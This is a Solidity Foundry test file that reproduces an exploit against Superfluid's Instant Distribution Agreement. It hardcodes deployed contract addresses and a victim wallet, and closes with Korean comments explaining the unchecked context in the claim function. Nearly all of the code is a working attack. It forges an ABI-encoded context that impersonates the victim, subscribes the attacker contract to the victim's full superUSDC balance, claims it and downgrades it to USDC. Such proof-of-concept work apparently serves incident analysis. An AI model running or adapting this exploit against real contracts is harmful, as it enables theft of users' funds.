// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./IERC20.sol";

interface ISuperfluid {
    function callAgreement(
         address agreementClass,
         bytes calldata callData,
         bytes calldata userData
     )
        external
        returns (bytes memory returnedData);
}

interface IInstantDistributionAgreementV1 {
    function createIndex(
        address token,
        uint32 indexId,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

     function updateIndex(
        address token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

    function updateSubscription(
        address token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

    function claim(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx)
        external
        returns(bytes memory newCtx);
}

interface ISuperToken is IERC20 {
    function downgrade(uint256 amount) external;
}

library ContextDefinitions {

    /**************************************************************************
    / Call info
    /**************************************************************************/

    // app level
    uint256 constant internal CALL_INFO_APP_LEVEL_MASK = 0xFF;

    // call type
    uint256 constant internal CALL_INFO_CALL_TYPE_SHIFT = 32;
    uint256 constant internal CALL_INFO_CALL_TYPE_MASK = 0xF << CALL_INFO_CALL_TYPE_SHIFT;
    uint8 constant internal CALL_INFO_CALL_TYPE_AGREEMENT = 1;
    uint8 constant internal CALL_INFO_CALL_TYPE_APP_ACTION = 2;
    uint8 constant internal CALL_INFO_CALL_TYPE_APP_CALLBACK = 3;

    function decodeCallInfo(uint256 callInfo)
        internal pure
        returns (uint8 appLevel, uint8 callType)
    {
        appLevel = uint8(callInfo & CALL_INFO_APP_LEVEL_MASK);
        callType = uint8((callInfo & CALL_INFO_CALL_TYPE_MASK) >> CALL_INFO_CALL_TYPE_SHIFT);
    }

    function encodeCallInfo(uint8 appLevel, uint8 callType)
        internal pure
        returns (uint256 callInfo)
    {
        return uint256(appLevel) | (uint256(callType) << CALL_INFO_CALL_TYPE_SHIFT);
    }

}

contract ExploitTest is Test {
    ISuperfluid superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 ida = IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    ISuperToken superusdc = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
    IERC20 usdc = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);

    address victim = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;

    function setUp() public {
    }

    /**
     * @dev ABIv2 Encoded memory data of context
     *
     * NOTE on backward compatibility:
     * - Non-dynamic fields are padded to 32bytes and packed
     * - Dynamic fields are referenced through a 32bytes offset to their "parents" field (or root)
     * - The order of the fields hence should not be rearranged in order to be backward compatible:
     *    - non-dynamic fields will be parsed at the same memory location,
     *    - and dynamic fields will simply have a greater offset than it was.
     */
    struct Context {
        //
        // Call context
        //
        // callback level
        uint8 appLevel;
        // type of call
        uint8 callType;
        // the system timestsamp
        uint256 timestamp;
        // The intended message sender for the call
        address msgSender;

        //
        // Callback context
        //
        // For callbacks it is used to know which agreement function selector is called
        bytes4 agreementSelector;
        // User provided data for app callbacks
        bytes userData;

        //
        // App context
        //
        // app allowance granted
        uint256 appAllowanceGranted;
        // app allowance wanted by the app callback
        uint256 appAllowanceWanted;
        // app allowance used, allowing negative values over a callback session
        int256 appAllowanceUsed;
        // app address
        address appAddress;
        // app allowance in super token
        address appAllowanceToken;
    }

    function encodeContext(Context memory context)
        private pure
        returns (bytes memory ctx)
    {
        uint256 callInfo = ContextDefinitions.encodeCallInfo(context.appLevel, context.callType);
        uint256 allowanceIO =
            uint128(context.appAllowanceGranted) |
            (uint256(uint128(context.appAllowanceWanted)) << 128);
        ctx = abi.encode(
            abi.encode(
                callInfo,
                context.timestamp,
                context.msgSender,
                context.agreementSelector,
                context.userData
            ),
            abi.encode(
                allowanceIO,
                context.appAllowanceUsed,
                context.appAddress,
                context.appAllowanceToken
            )
        );
    }

    function test() public {
        Context memory ctx = Context({
            appLevel: 0,
            callType: ContextDefinitions.CALL_INFO_CALL_TYPE_AGREEMENT,
            timestamp: block.timestamp,
            msgSender: victim,
            agreementSelector: 0,
            userData: "",
            appAllowanceGranted: 0,
            appAllowanceWanted: 0,
            appAllowanceUsed: 0,
            appAddress: address(0),
            appAllowanceToken: address(0)
        });

        uint32 indexId = 0x1337;

        superfluid.callAgreement(
            address(ida),
            abi.encodeWithSelector(
                IInstantDistributionAgreementV1.createIndex.selector,
                superusdc,
                indexId,
                encodeContext(ctx),
                new bytes(0)
            ),
            new bytes(0)
        );

        uint256 units = superusdc.balanceOf(victim);
        emit log_named_uint("units", units);

        superfluid.callAgreement(
            address(ida),
            abi.encodeWithSelector(
                IInstantDistributionAgreementV1.updateSubscription.selector,
                superusdc,
                indexId,
                address(this),
                units,
                encodeContext(ctx),
                new bytes(0)
            ),
            new bytes(0)
        );

        superfluid.callAgreement(
            address(ida),
            abi.encodeWithSelector(
                IInstantDistributionAgreementV1.updateIndex.selector,
                superusdc,
                indexId,
                1,
                encodeContext(ctx),
                new bytes(0)
            ),
            new bytes(0)
        );

        superfluid.callAgreement(
            address(ida),
            abi.encodeWithSelector(
                IInstantDistributionAgreementV1.claim.selector,
                superusdc,
                victim,
                indexId,
                address(this),
                new bytes(0)
            ),
            new bytes(0)
        );

        emit log_named_uint("my superusdc balance", superusdc.balanceOf(address(this)));
        emit log_named_uint("my USDC balance", usdc.balanceOf(address(this)));

        superusdc.downgrade(superusdc.balanceOf(address(this)));

        emit log_named_uint("my superusdc balance", superusdc.balanceOf(address(this)));
        emit log_named_uint("my USDC balance", usdc.balanceOf(address(this)));
    }
}
//패치 했을 때 안전하려면 넘어온 곳 모든 곳에서 해시 검사를 해야 하는데, context 넘겨 받았는데 해시를 검사하지 않고 decode 바로 하는 곳이 딱 한 곳 있었음(claim 함수)
//claim 함수 인자에는 context가 있어서 조작된 context 들어갈 수 있음. 
//claim은 설정돼있는 값들을 받아가는 함수라서 별 문제 없는 것 같아 보이지만, 내부적으로 context를 업데이트 하는 부분이 있음
//검증 되지 않은 상태로 update가 트리거 되면, 오염된 데이터를 인증해주게 됨